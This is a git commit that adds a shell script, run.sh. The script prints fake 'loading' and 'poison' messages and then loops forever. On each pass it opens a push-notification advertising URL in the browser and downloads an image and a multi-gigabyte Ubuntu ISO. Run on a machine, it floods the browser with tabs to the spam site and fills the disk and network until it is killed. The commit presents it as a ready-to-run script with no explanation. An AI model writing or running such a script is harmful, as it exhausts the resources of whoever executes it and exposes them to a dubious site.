22058ecae4f54c1ab72a04785cf3bfa8951f50f5
/azeem <136465208+Aze0029@users.noreply.github.com>
2023-06-16 10:03:12 -0400

    run.sh

---
+++ run.sh
@@ -0,0 +1,26 @@
+echo poison.run.conf.true
+sleep 1
+clear
+echo loading.
+sleep 1
+clear
+echo loading..
+sleep 1
+clear
+echo loading...
+sleep 1
+echo PACKET:prep
+sleep 1
+echo download-w-l
+echo l-bo-1
+echo gb-eater
+echo term-bo-ech-1
+sleep 3
+
+while :
+do
+	open "https://www1.notifpushnext.net/cADYtZpUPcuk-lcyNV32MFA72gGR_bLfjoHYxkks2v8?preview=4136&sg=9f4716f51d23ee7db5e53ef6a2614690&cid=JxGj_E8J2iFojUiTAv865DgfV6m8hRJ0&sid=lp_tgnNPZtk_65942"
+  wget https://cdn.shopify.com/s/files/1/0439/4988/3552/products/1b4e3341459642a7a895de6d7ba9a84f.thumbnail.0000000.jpg?v=1605551542
+  wget https://releases.ubuntu.com/22.04.2/ubuntu-22.04.2-desktop-amd64.iso?_ga=2.120203790.700728597.1686923967-1556971733.1686669488
+  echo poison
+done
